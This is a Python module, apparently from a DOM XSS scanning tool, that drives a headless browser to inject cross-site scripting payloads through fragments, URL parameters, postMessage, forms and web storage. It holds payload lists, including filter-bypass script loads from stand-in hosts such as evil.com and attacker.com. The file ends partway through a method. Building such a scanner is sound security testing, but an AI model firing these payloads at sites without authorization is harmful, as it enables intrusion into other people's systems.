#!/usr/bin/env python3

"""
Project: BRS-XSS (XSS Detection Suite)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Sun 10 Aug 2025 21:38:09 MSK
Status: Modified
Telegram: https://t.me/EasyProTech
"""

import asyncio
import time
from typing import Optional, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    from playwright.async_api import async_playwright, Browser

    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

from brsxss.utils.logger import Logger

logger = Logger("dom.headless_detector")


@dataclass
class DOMXSSResult:
    """DOM XSS detection result"""

    url: str
    vulnerable: bool = False
    payload: str = ""
    trigger_method: str = ""  # fragment, postMessage, form_submit, storage_injection
    execution_context: str = ""  # innerHTML, eval, etc.
    source: str = ""  # DOM source: location.hash, localStorage, form input, etc.
    sink: str = ""  # DOM sink: innerHTML, document.write, eval, etc.
    screenshot_path: Optional[str] = None
    console_logs: list[str] = field(default_factory=list)
    error_logs: list[str] = field(default_factory=list)
    score: float = 0.0

    def __post_init__(self):
        if self.console_logs is None:
            self.console_logs = []
        if self.error_logs is None:
            self.error_logs = []


class HeadlessDOMDetector:
    """
    Headless browser DOM XSS detector.

    Functions:
    - Fragment-based XSS detection (location.hash)
    - postMessage XSS detection
    - URL parameter DOM injection
    - JavaScript execution monitoring
    - Console alert detection
    - Error handling and screenshot capture
    """

    def __init__(
        self,
        headless: bool = True,
        timeout: int = 30,
        max_workers: int = 2,
        use_gpu: bool = False,
    ):
        """Initialize detector"""
        if not PLAYWRIGHT_AVAILABLE:
            raise ImportError(
                "Playwright is required for DOM XSS detection. Install with: pip install playwright"
            )

        self.headless = headless
        self.timeout = timeout
        self.browser: Optional[Browser] = None
        self.context = None
        self.max_workers = max(1, max_workers)
        self.use_gpu = use_gpu
        self._worker_semaphore = asyncio.Semaphore(self.max_workers)

        # DOM XSS payloads for different injection points
        self.fragment_payloads = [
            # HTML tag injection
            "<script>alert('DOM_XSS_FRAGMENT')</script>",
            "<img src=x onerror=alert('DOM_XSS_FRAGMENT')>",
            "<svg onload=alert('DOM_XSS_FRAGMENT')>",
            "</script><script>alert('DOM_XSS_FRAGMENT')</script>",
            # Attribute breakout (single quote) - for cases like src='...NUM...'
            "1' onerror='alert(1)'",
            "1' onload='alert(1)'",
            "x' onerror='alert(1)' x='",
            # Attribute breakout (double quote) - for cases like src="...NUM..."
            '1" onerror="alert(1)"',
            '1" onload="alert(1)"',
            'x" onerror="alert(1)" x="',
            # JavaScript context
            "javascript:alert('DOM_XSS_FRAGMENT')",
            "'-alert('DOM_XSS_FRAGMENT')-'",
            "\";alert('DOM_XSS_FRAGMENT');//",
            "');alert('DOM_XSS_FRAGMENT');//",
            # Path traversal + event handler
            "../x' onerror='alert(1)",
            "..%2Fx' onerror='alert(1)",
        ]

        self.postmessage_payloads = [
            "<script>alert('DOM_XSS_POSTMSG')</script>",
            "<img src=x onerror=alert('DOM_XSS_POSTMSG')>",
            "javascript:alert('DOM_XSS_POSTMSG')",
        ]

        # Form/storage payloads (for DOM XSS via form/storage sinks)
        self.dom_sink_payloads = [
            "<img src=x onerror=alert('DOM_XSS')>",
            "<svg onload=alert('DOM_XSS')>",
            "<body onload=alert('DOM_XSS')>",
            "<iframe src=javascript:alert('DOM_XSS')>",
            "<input onfocus=alert('DOM_XSS') autofocus>",
            "<marquee onstart=alert('DOM_XSS')>",
            "<video><source onerror=alert('DOM_XSS')>",
            "<details open ontoggle=alert('DOM_XSS')>",
        ]

        # JavaScript sinks payloads (setTimeout, eval, Function)
        self.js_sink_payloads = {
            "setTimeout": [
                "1');alert('DOM_XSS_JS');//",
                "alert('DOM_XSS_JS')",
                "1);alert('DOM_XSS_JS');//",
                "');alert('DOM_XSS_JS');//",
            ],
            "eval": [
                "alert('DOM_XSS_JS')",
                "eval('alert(\\'DOM_XSS_JS\\')')",
                "alert(String.fromCharCode(68,79,77,95,88,83,83,95,74,83))",
            ],
            "Function": [
                "alert('DOM_XSS_JS')",
                "Function('alert(\\'DOM_XSS_JS\\')')()",
                "new Function('alert(\\'DOM_XSS_JS\\')')()",
            ],
        }

        # JavaScript URI payloads (location.assign, href)
        self.js_uri_payloads = [
            "javascript:alert('DOM_XSS_URI')",
            "javascript:alert(String.fromCharCode(68,79,77,95,88,83,83,95,85,82,73))",
            "javascript:void(alert('DOM_XSS_URI'))",
        ]

        # External script load payloads (for query parameters)
        self.external_script_payloads = [
            "//evil.com/xss.js",
            "http://evil.com/xss.js",
            "https://evil.com/xss.js",
        ]

        # Fragment-based external script payloads (for Level6-style vulnerabilities)
        # These bypass http:// filters using protocol-relative URLs or data URIs
        self.fragment_script_payloads = [
            "//xss.rocks/xss.js",
            "//evil.com/xss.js",
            "//attacker.com/payload.js",
            "data:text/javascript,alert('DOM_XSS_SCRIPT')",
            "data:text/javascript;base64,YWxlcnQoJ0RPTV9YU1NfU0NSSVBUJyk=",
            # Case variations to bypass filters
            "//XSS.rocks/xss.js",
            "//xss.ROCKS/xss.js",
            # With path variations
            "/\\evil.com/xss.js",
            "///evil.com/xss.js",
        ]

        # Statistics
        self.tests_performed = 0
        self.vulnerabilities_found = 0

        logger.info("Headless DOM XSS detector initialized")

    async def __aenter__(self):
        """Async context manager entry"""
        await self.start()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.close()

    async def start(self):
        """Start browser instance"""
        try:
            self.playwright = await async_playwright().start()
            launch_args = [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-web-security",
            ]
            if self.use_gpu:
                launch_args.extend(
                    ["--enable-gpu", "--use-gl=desktop", "--ignore-gpu-blocklist"]
                )
            else:
                launch_args.extend(
                    ["--disable-gpu", "--disable-features=VizDisplayCompositor"]
                )
            self.browser = await self.playwright.chromium.launch(
                headless=self.headless, args=launch_args
            )
            self.context = await self.browser.new_context(
                viewport={"width": 1280, "height": 720},
                user_agent="BRS-XSS DOM Scanner",
            )
            logger.info("Browser instance started")
        except Exception as e:
            logger.error(f"Failed to start browser: {e}")
            logger.info(
                "If this is the first run, install browsers: `playwright install`."
            )
            raise

    async def close(self):
        """Close browser instance"""
        try:
            if self.context:
                await self.context.close()
            if self.browser is not None:
                await self.browser.close()
            if hasattr(self, "playwright"):
                await self.playwright.stop()
            logger.info("Browser instance closed")
        except Exception as e:
            logger.error(f"Error closing browser: {e}")

    async def _new_page(self):
        """Create new page with context check"""
        if not self.context:
            raise RuntimeError("Browser context not initialized. Call start() first.")
        return await self.context.new_page()

    async def detect_dom_xss(
        self,
        url: str,
        parameters: Optional[dict[str, str]] = None,
        form_info: Optional[dict[str, Any]] = None,
    ) -> list[DOMXSSResult]:
        """
        Main DOM XSS detection method.

        Args:
            url: Target URL
            parameters: Optional parameters to test
            form_info: Optional form information for JavaScript-handled forms
                      Format: {"fields": {"field_name": "default_value"}, "form_id": "...", "form_class": "..."}

        Returns:
            list of DOM XSS results
        """
        results: list[DOMXSSResult] = []

        if not self.browser:
            await self.start()

        try:
            tasks = []

            async def run(coro):
                async with self._worker_semaphore:
                    return await coro

            tasks.append(asyncio.create_task(run(self._test_fragment_xss(url))))
            tasks.append(asyncio.create_task(run(self._test_fragment_external_script(url))))
            tasks.append(asyncio.create_task(run(self._test_postmessage_xss(url))))
            tasks.append(asyncio.create_task(run(self._test_storage_dom_xss(url))))

            if parameters:
                tasks.append(
                    asyncio.create_task(
                        run(self._test_parameter_dom_xss(url, parameters))
                    )
                )
                tasks.append(
                    asyncio.create_task(
                        run(self._test_javascript_sinks(url, parameters))
                    )
                )
                tasks.append(
                    asyncio.create_task(run(self._test_javascript_uri(url, parameters)))
                )
                tasks.append(
                    asyncio.create_task(
                        run(self._test_external_script_loads(url, parameters))
                    )
                )
                tasks.append(
                    asyncio.create_task(run(self._test_jquery_sinks(url, parameters)))
                )

            if form_info and form_info.get("fields"):
                tasks.append(
                    asyncio.create_task(
                        run(self._test_form_dom_xss(url, form_info.get("fields")))
                    )
                )
            else:
                tasks.append(asyncio.create_task(run(self._test_form_dom_xss(url))))

            task_results = await asyncio.gather(*tasks, return_exceptions=True)
            for task_result in task_results:
                if isinstance(task_result, Exception):
                    logger.error(f"DOM detector task error: {task_result}")
                    continue
                if task_result and isinstance(task_result, list):
                    results.extend(task_result)

            self.vulnerabilities_found += sum(
                1 for r in results if getattr(r, "vulnerable", False)
            )

        except Exception as e:
            logger.error(f"Error during DOM XSS detection: {e}")

        return results

    async def _test_fragment_xss(self, url: str) -> list[DOMXSSResult]:
        """Test fragment-based DOM XSS (location.hash) - PARALLEL with semaphore"""
        results: list[DOMXSSResult] = []
        found_vuln = asyncio.Event()
        base_url = url.split('#')[0]

        async def test_single_payload(payload: str) -> Optional[DOMXSSResult]:
            if found_vuln.is_set():
                return None

            # Use semaphore to limit concurrent browser pages
            async with self._worker_semaphore:
                if found_vuln.is_set():
                    return None

                self.tests_performed += 1
                test_url = f"{base_url}#{payload}"

                result = DOMXSSResult(
                    url=test_url,
                    payload=payload,
                    trigger_method="fragment",
                    execution_context="location.hash",
                    source="location.hash",
                    sink="innerHTML/document.write",
                )

                page = None
                try:
                    page = await self._new_page()

                    console_logs: list[str] = []
                    error_logs: list[str] = []

                    page.on("console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}"))
                    page.on("pageerror", lambda exc: error_logs.append(str(exc)))

                    async def handle_dialog(dlg):
                        console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                        try:
                            await dlg.dismiss()
                        except Exception:
                            pass  # Page may be closed

                    page.on("dialog", handle_dialog)

                    # First navigate to base URL
                    await page.goto(base_url, timeout=self.timeout * 1000, wait_until="domcontentloaded")

                    # Then set hash via JavaScript (avoids URL encoding)
                    await page.evaluate(f"window.location.hash = {repr(payload)}")

                    # Wait for DOM to process the hash change
                    await page.wait_for_timeout(2000)

                    # Check for XSS execution
                    result.vulnerable = self._check_xss_execution(
                        console_logs, error_logs, payload, result.sink
                    )
                    result.console_logs = console_logs
                    result.error_logs = error_logs

                    if result.vulnerable:
                        result.score = 8.5
                        logger.warning(f"Fragment XSS found: {url} with payload: {payload[:30]}...")
                        found_vuln.set()

                    return result

                except Exception as e:
                    logger.error(f"Error testing fragment payload {payload[:20]}...: {e}")
                    return None
                finally:
                    if page:
                        try:
                            await page.close()
                        except Exception:
                            pass

        # Run all payload tests in parallel (semaphore limits concurrent pages)
        tasks = [test_single_payload(p) for p in self.fragment_payloads]
        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _test_fragment_external_script(self, url: str) -> list[DOMXSSResult]:
        """
        Test fragment-based external script injection (Level6-style).
        
        Targets vulnerabilities where fragment is used to load external scripts:
        - includeGadget(location.hash.substr(1))
        - script.src = location.hash.slice(1)
        
        Payloads bypass http:// filters using protocol-relative URLs.
        """
        results: list[DOMXSSResult] = []
        found_vuln = asyncio.Event()
        base_url = url.split('#')[0]

        async def test_single_payload(payload: str) -> Optional[DOMXSSResult]:
            if found_vuln.is_set():
                return None

            async with self._worker_semaphore:
                if found_vuln.is_set():
                    return None

                self.tests_performed += 1
                test_url = f"{base_url}#{payload}"

                result = DOMXSSResult(
                    url=test_url,
                    payload=payload,
                    trigger_method="fragment",
                    execution_context="external_script_fragment",
                    source="location.hash",
                    sink="script.src",
                )

                page = None
                try:
                    page = await self._new_page()

                    console_logs: list[str] = []
                    error_logs: list[str] = []
                    script_requests: list[str] = []

                    page.on(
                        "console",
                        lambda msg: console_logs.append(f"{msg.type}: {msg.text}"),
                    )
                    page.on("pageerror", lambda exc: error_logs.append(str(exc)))

                    async def handle_dialog(dlg):
                        console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                        try:
                            await dlg.dismiss()
                        except Exception:
                            pass

                    page.on("dialog", handle_dialog)

                    # Monitor network requests for script loads
                    async def handle_request(request):
                        if request.resource_type == "script":
                            script_requests.append(request.url)
                            console_logs.append(f"script_request: {request.url}")

                    page.on("request", handle_request)

                    # Navigate to page with fragment payload
                    await page.goto(
                        test_url, timeout=self.timeout * 1000, wait_until="networkidle"
                    )

                    # Wait for potential script loads
                    await page.wait_for_timeout(3000)

                    # Check for external script requests (protocol-relative or data URIs)
                    external_script_detected = any(
                        "evil.com" in req
                        or "xss.rocks" in req
                        or "attacker.com" in req
                        or req.startswith("data:")
                        for req in script_requests
                    )

                    # Check for XSS execution markers
                    xss_executed = self._check_xss_execution(
                        console_logs, error_logs, payload, result.sink
                    )

                    result.vulnerable = external_script_detected or xss_executed
                    result.console_logs = console_logs
                    result.error_logs = error_logs

                    if result.vulnerable:
                        result.score = 9.0  # High severity - external script load
                        found_vuln.set()
                        logger.warning(
                            f"Fragment external script XSS found: {payload}"
                        )

                except Exception as e:
                    logger.debug(f"Error in fragment external script test: {e}")
                    result.error_logs.append(str(e))
                finally:
                    if page:
                        await page.close()

                return result if result.vulnerable else None

        tasks = [test_single_payload(p) for p in self.fragment_script_payloads]
        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _test_postmessage_xss(self, url: str) -> list[DOMXSSResult]:
        """Test postMessage-based DOM XSS - PARALLEL with semaphore"""
        results: list[DOMXSSResult] = []
        found_vuln = asyncio.Event()

        async def test_single_payload(payload: str) -> Optional[DOMXSSResult]:
            if found_vuln.is_set():
                return None

            # Use semaphore to limit concurrent browser pages
            async with self._worker_semaphore:
                if found_vuln.is_set():
                    return None

                self.tests_performed += 1

                try:
                    result = await self._execute_postmessage_test(url, payload)

                    if result.vulnerable:
                        logger.warning(f"postMessage XSS found: {url}")
                        found_vuln.set()

                    return result

                except Exception as e:
                    logger.error(f"Error testing postMessage payload: {e}")
                    return None

        tasks = [test_single_payload(p) for p in self.postmessage_payloads]
        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _test_parameter_dom_xss(
        self, url: str, parameters: dict[str, str]
    ) -> list[DOMXSSResult]:
        """Test URL parameter DOM injection - PARALLEL with semaphore"""
        results: list[DOMXSSResult] = []
        found_vulns: set[str] = set()  # Track found vulns per param

        async def test_param_payload(
            param_name: str, payload: str
        ) -> Optional[DOMXSSResult]:
            if param_name in found_vulns:
                return None

            # Use semaphore to limit concurrent browser pages
            async with self._worker_semaphore:
                if param_name in found_vulns:
                    return None

                self.tests_performed += 1

                try:
                    test_url = self._inject_parameter_payload(url, param_name, payload)
                    result = await self._execute_payload_test(
                        test_url,
                        payload,
                        "parameter",
                        f"URL parameter: {param_name}",
                        source=f"location.search ({param_name})",
                        sink="innerHTML/DOM",
                    )

                    if result.vulnerable:
                        logger.warning(f"Parameter DOM XSS found: {param_name} in {url}")
                        found_vulns.add(param_name)

                    return result

                except Exception as e:
                    logger.error(f"Error testing parameter {param_name}: {e}")
                    return None

        # Create tasks for all param+payload combinations (semaphore limits concurrent pages)
        tasks = [
            test_param_payload(param_name, payload)
            for param_name in parameters
            for payload in self.fragment_payloads
        ]

        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _execute_payload_test(
        self,
        test_url: str,
        payload: str,
        trigger_method: str,
        context: str,
        source: str = "",
        sink: str = "",
    ) -> DOMXSSResult:
        """Execute payload test in browser"""
        result = DOMXSSResult(
            url=test_url,
            payload=payload,
            trigger_method=trigger_method,
            execution_context=context,
            source=source or context,
            sink=sink or "innerHTML",
        )

        page = None
        try:
            page = await self._new_page()

            # set up console monitoring
            console_logs = []
            error_logs = []

            page.on(
                "console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}")
            )
            page.on("pageerror", lambda exc: error_logs.append(str(exc)))

            # Capture dialogs (alert/confirm/prompt)
            async def handle_dialog(dlg):
                console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                await dlg.dismiss()

            page.on("dialog", handle_dialog)

            # Navigate to page with payload
            await page.goto(
                test_url, timeout=self.timeout * 1000, wait_until="networkidle"
            )

            # Wait for potential DOM execution
            await page.wait_for_timeout(2000)

            # Check for successful XSS execution
            result.vulnerable = self._check_xss_execution(
                console_logs, error_logs, payload, result.sink
            )
            result.console_logs = console_logs
            result.error_logs = error_logs

            if result.vulnerable:
                result.score = 8.5  # High score for DOM XSS

                # Take screenshot for evidence
                try:
                    screenshot_path = f"/tmp/dom_xss_{int(time.time())}.png"
                    await page.screenshot(path=screenshot_path)
                    result.screenshot_path = screenshot_path
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Error executing payload test: {e}")
            result.error_logs.append(str(e))

        finally:
            if page:
                await page.close()

        return result

    async def _execute_postmessage_test(self, url: str, payload: str) -> DOMXSSResult:
        """Execute postMessage XSS test"""
        result = DOMXSSResult(
            url=url,
            payload=payload,
            trigger_method="postMessage",
            execution_context="window.postMessage",
            source="postMessage",
            sink="innerHTML/eval",
        )

        page = None
        try:
            page = await self._new_page()

            console_logs = []
            error_logs = []

            page.on(
                "console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}")
            )
            page.on("pageerror", lambda exc: error_logs.append(str(exc)))

            async def handle_dialog(dlg):
                console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                await dlg.dismiss()

            page.on("dialog", handle_dialog)

            # Navigate to page
            await page.goto(url, timeout=self.timeout * 1000, wait_until="networkidle")

            # Send postMessage with payload
            await page.evaluate(
                f"""
                window.postMessage({repr(payload)}, '*');
                window.postMessage({{data: {repr(payload)}}}, '*');
            """
            )

            await page.wait_for_timeout(2000)

            result.vulnerable = self._check_xss_execution(
                console_logs, error_logs, payload, result.sink
            )
            result.console_logs = console_logs
            result.error_logs = error_logs

            if result.vulnerable:
                result.score = 7.5

        except Exception as e:
            logger.error(f"Error in postMessage test: {e}")
            result.error_logs.append(str(e))

        finally:
            if page:
                await page.close()

        return result

    def _check_xss_execution(
        self,
        console_logs: list[str],
        error_logs: list[str],
        payload: str,
        sink: str = "",
    ) -> bool:
        """
        Check if XSS payload executed successfully.

        Note: innerText and textContent sinks are safe - they don't execute code,
        so we should never get false positives from them. This method only checks
        for actual code execution (alert/dialog events), not just payload presence.
        """

        # Safe sinks that don't execute code - should never trigger alerts
        safe_sinks = ["innertext", "textcontent"]
        if sink.lower() in safe_sinks:
            # Even if payload is present, innerText/textContent won't execute it
            # So we should never get alerts from these sinks
            return False

        # Look for alert/dialog signatures in console
        alert_signatures = [
            "DOM_XSS_FRAGMENT",
            "DOM_XSS_POSTMSG",
            "DOM_XSS",
            "DOM_XSS_JS",
            "DOM_XSS_URI",
            "alert('DOM_XSS",
            "XSS_DETECTED",
            "dialog: alert",  # Playwright dialog event
            "dialog: confirm",
            "dialog: prompt",
        ]

        all_logs = " ".join(console_logs + error_logs).lower()

        for signature in alert_signatures:
            if signature.lower() in all_logs:
                return True

        # Check for any dialog that was triggered (strong indicator)
        for log in console_logs:
            if log.startswith("dialog:"):
                return True

        # Check for JavaScript execution errors that might indicate successful injection
        execution_indicators = [
            "script error",
            "uncaught referenceerror",
            "unexpected token",
            "syntax error",
        ]

        for indicator in execution_indicators:
            if indicator in all_logs and any(
                sig in payload.lower() for sig in ["script", "alert", "onerror"]
            ):
                return True

        return False

    def _inject_parameter_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    async def _test_form_dom_xss(
        self, url: str, target_fields: Optional[dict[str, str]] = None
    ) -> list[DOMXSSResult]:
        """
        Test form-based DOM XSS - fills forms and checks for DOM sink execution

        Args:
            url: Target URL
            target_fields: Optional dict of field names to test (if None, auto-detect)
        """
        results = []

        # If target_fields provided, prioritize those fields
        field_names_to_test = list(target_fields.keys()) if target_fields else None

        for payload in self.dom_sink_payloads[:5]:  # Test top 5 payloads
            self.tests_performed += 1
            page = None

            try:
                page = await self._new_page()

                # set up dialog handler BEFORE navigation
                console_logs = []
                error_logs = []

                def handle_console(msg):
                    console_logs.append(f"{msg.type}: {msg.text}")

                def handle_error(exc):
                    error_logs.append(str(exc))

                async def handle_dialog(dlg):
                    console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                    await dlg.dismiss()

                page.on("console", handle_console)
                page.on("pageerror", handle_error)
                page.on("dialog", handle_dialog)

                # Navigate to page
                await page.goto(
                    url, timeout=self.timeout * 1000, wait_until="networkidle"
                )

                # Find text inputs and textareas
                # If target_fields provided, prioritize those specific fields
                if field_names_to_test:
                    input_selectors = []
                    # Add specific selectors for target fields first
                    for field_name in field_names_to_test:
                        input_selectors.extend(
                            [
                                f'textarea[name="{field_name}"]',
                                f'input[name="{field_name}"]',
                                f"#{field_name}",
                                f'[name="{field_name}"]',
                            ]
                        )
                    # Then add generic selectors
                    input_selectors.extend(
                        [
                            "textarea",
                            'input[type="text"]',
                            "input:not([type])",
                        ]
                    )
                else:
                    # Default selectors (auto-detect)
                    input_selectors = [
                        "textarea",
                        'textarea[name="content"]',
                        'textarea[name="message"]',
                        'textarea[name="comment"]',
                        "#post-content",
                        "#message",
                        "#comment",
                        'input[type="text"]',
                        "input:not([type])",
                        'input[name="content"]',
                        'input[name="message"]',
                        'input[name="comment"]',
                    ]

                # Try to fill and submit using JavaScript (more reliable)
                filled = False

                # Escape payload for JavaScript string - use JSON.stringify for proper escaping
                import json

                escaped_payload = json.dumps(payload)

                # Try common input selectors via JS
                for selector in input_selectors:
                    try:
                        result = await page.evaluate(
                            f"""
                            (function() {{
                                var el = document.querySelector("{selector}");
                                if (el) {{
                                    el.value = {escaped_payload};
                                    // Also trigger input event to ensure handlers fire
                                    el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                                    el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                    return true;
                                }}
                                return false;
                            }})();
                        """
                        )
                        if result:
                            filled = True
                            logger.debug(f"Filled {selector} with payload via JS")
                            break
                    except Exception as e:
                        logger.debug(f"Error filling {selector}: {e}")
                        continue

                if not filled:
                    logger.debug("No input fields found")
                    continue

                # Find and click submit button via JS
                submit_selectors = [
                    "input.share",
                    ".share",
                    'input[type="submit"]',
                    'button[type="submit"]',
                    ".submit",
                    "#submit",
                    "button:not([type])",
                    "form button",
                    'form input[type="submit"]',
                ]

                submitted = False
                for selector in submit_selectors:
                    try:
                        result = await page.evaluate(
                            f"""
                            (function() {{
                                var btn = document.querySelector("{selector}");
                                if (btn) {{
                                    // Try both click() and form submit
                                    btn.click();
                                    // Also try form submit if it's a form button
                                    var form = btn.closest('form');
                                    if (form) {{
                                        form.dispatchEvent(new Event('submit', {{ bubbles: true, cancelable: true }}));
                                    }}
                                    return true;
                                }}
                                return false;
                            }})();
                        """
                        )
                        if result:
                            submitted = True
                            logger.debug(f"Clicked {selector} via JS")
                            break
                    except Exception as e:
                        logger.debug(f"Error clicking {selector}: {e}")
                        continue

                if not submitted:
                    # Try pressing Enter in the filled field
                    try:
                        await page.keyboard.press("Enter")
                        submitted = True
                    except Exception:
                        pass

                # Wait for DOM updates and execution
                await page.wait_for_timeout(1000)  # Wait for form submission
                # Wait for potential DOM manipulation
                try:
                    await page.wait_for_function(
                        "document.getElementById('post-container') !== null",
                        timeout=2000,
                    )
                except Exception:
                    pass
                await page.wait_for_timeout(2000)  # Additional wait for XSS execution

                # Check if XSS executed
                vulnerable = self._check_xss_execution(
                    console_logs, error_logs, payload, "innerHTML"
                )

                result = DOMXSSResult(
                    url=url,
                    payload=payload,
                    trigger_method="form_submit",
                    execution_context="form -> innerHTML",
                    source="form input",
                    sink="innerHTML",
                    vulnerable=vulnerable,
                    console_logs=console_logs,
                    error_logs=error_logs,
                    score=9.0 if vulnerable else 0.0,
                )
                results.append(result)

                if vulnerable:
                    logger.warning(
                        f"[DOM XSS] Form-based DOM XSS confirmed: {payload[:50]}"
                    )
                    try:
                        screenshot_path = f"/tmp/dom_xss_form_{int(time.time())}.png"
                        await page.screenshot(path=screenshot_path)
                        result.screenshot_path = screenshot_path
                    except Exception:
                        pass
                    break  # Found vulnerability, stop testing

            except Exception as e:
                logger.debug(f"Error testing form payload: {e}")
            finally:
                if page:
                    try:
                        await page.close()
                    except Exception:
                        pass

        return results

    async def _test_storage_dom_xss(self, url: str) -> list[DOMXSSResult]:
        """Test localStorage/sessionStorage based DOM XSS"""
        results = []

        page = None
        try:
            page = await self._new_page()

            # Navigate to page first to set storage in correct origin
            await page.goto(url, timeout=self.timeout * 1000, wait_until="networkidle")

            for payload in self.dom_sink_payloads[:3]:
                self.tests_performed += 1

                try:
                    console_logs = []
                    error_logs = []

                    page.on(
                        "console",
                        lambda msg: console_logs.append(f"{msg.type}: {msg.text}"),
                    )
                    page.on("pageerror", lambda exc: error_logs.append(str(exc)))

                    async def handle_dialog(dlg):
                        console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                        await dlg.dismiss()

                    page.on("dialog", handle_dialog)

                    # Inject payload into localStorage and sessionStorage
                    await page.evaluate(
                        f"""
                        // Common storage keys that apps might read
                        const keys = ['user', 'username', 'name', 'message', 'content', 'data', 'html', 'text', 'value', 'input'];
                        const payload = {repr(payload)};

                        keys.forEach(key => {{
                            localStorage.setItem(key, payload);
                            sessionStorage.setItem(key, payload);
                        }});
                    """
                    )

                    # Reload page to trigger reading from storage
                    await page.reload(wait_until="networkidle")
                    await page.wait_for_timeout(2000)

                    # Check for XSS execution
                    vulnerable = self._check_xss_execution(
                        console_logs, error_logs, payload, "innerHTML"
                    )

                    result = DOMXSSResult(
                        url=url,
                        payload=payload,
                        trigger_method="storage_injection",
                        execution_context="storage -> innerHTML",
                        source="localStorage/sessionStorage",
                        sink="innerHTML",
                        vulnerable=vulnerable,
                        console_logs=console_logs,
                        error_logs=error_logs,
                        score=9.5 if vulnerable else 0.0,  # Storage DOM XSS is critical
                    )
                    results.append(result)

                    if vulnerable:
                        logger.warning("Storage-based DOM XSS confirmed")
                        break

                    # Clear storage for next test
                    await page.evaluate("localStorage.clear(); sessionStorage.clear();")

                except Exception as e:
                    logger.debug(f"Error testing storage payload: {e}")

        except Exception as e:
            logger.error(f"Error in storage DOM XSS test: {e}")
        finally:
            if page:
                await page.close()

        return results

    async def _test_javascript_sinks(
        self, url: str, parameters: dict[str, str]
    ) -> list[DOMXSSResult]:
        """Test JavaScript sinks: setTimeout, eval, Function - PARALLEL"""
        results: list[DOMXSSResult] = []
        found_vulns: set[tuple[str, str]] = set()  # (param, sink_type)

        async def test_js_sink(
            param_name: str, sink_type: str, payload: str
        ) -> Optional[DOMXSSResult]:
            key = (param_name, sink_type)
            if key in found_vulns:
                return None

            self.tests_performed += 1

            try:
                test_url = self._inject_parameter_payload(url, param_name, payload)
                result = await self._execute_javascript_sink_test(
                    test_url, payload, sink_type, param_name
                )

                if result.vulnerable:
                    logger.warning(
                        f"JavaScript sink XSS found: {sink_type} in {param_name}"
                    )
                    found_vulns.add(key)

                return result

            except Exception as e:
                logger.debug(f"Error testing JS sink {sink_type} with payload: {e}")
                return None

        # Create tasks for all combinations
        tasks = [
            test_js_sink(param_name, sink_type, payload)
            for param_name in parameters
            for sink_type, payloads in self.js_sink_payloads.items()
            for payload in payloads
        ]

        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _execute_javascript_sink_test(
        self, test_url: str, payload: str, sink_type: str, param_name: str
    ) -> DOMXSSResult:
        """Execute JavaScript sink test (setTimeout, eval, Function)"""
        result = DOMXSSResult(
            url=test_url,
            payload=payload,
            trigger_method="parameter",
            execution_context=f"javascript_{sink_type.lower()}",
            source=f"URL parameter: {param_name}",
            sink=sink_type,
        )

        page = None
        try:
            page = await self._new_page()

            console_logs = []
            error_logs = []

            page.on(
                "console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}")
            )
            page.on("pageerror", lambda exc: error_logs.append(str(exc)))

            async def handle_dialog(dlg):
                console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                await dlg.dismiss()

            page.on("dialog", handle_dialog)

            # Navigate to page
            await page.goto(
                test_url, timeout=self.timeout * 1000, wait_until="networkidle"
            )

            # Wait for potential execution
            await page.wait_for_timeout(2000)

            # Check for XSS execution
            result.vulnerable = self._check_xss_execution(
                console_logs, error_logs, payload, result.sink
            )
            result.console_logs = console_logs
            result.error_logs = error_logs

            if result.vulnerable:
                result.score = 9.0  # High score for JS sink XSS
                try:
                    screenshot_path = (
                        f"/tmp/dom_xss_js_{sink_type}_{int(time.time())}.png"
                    )
                    await page.screenshot(path=screenshot_path)
                    result.screenshot_path = screenshot_path
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Error in JavaScript sink test: {e}")
            result.error_logs.append(str(e))
        finally:
            if page:
                await page.close()

        return result

    async def _test_javascript_uri(
        self, url: str, parameters: dict[str, str]
    ) -> list[DOMXSSResult]:
        """Test JavaScript URI sinks (location.assign, href) - PARALLEL"""
        results: list[DOMXSSResult] = []
        found_vulns: set[str] = set()

        async def test_uri_payload(
            param_name: str, payload: str
        ) -> Optional[DOMXSSResult]:
            if param_name in found_vulns:
                return None

            self.tests_performed += 1

            try:
                test_url = self._inject_parameter_payload(url, param_name, payload)
                result = await self._execute_javascript_uri_test(
                    test_url, payload, param_name
                )

                if result.vulnerable:
                    logger.warning(f"JavaScript URI XSS found in {param_name}")
                    found_vulns.add(param_name)

                return result

            except Exception as e:
                logger.debug(f"Error testing JS URI payload: {e}")
                return None

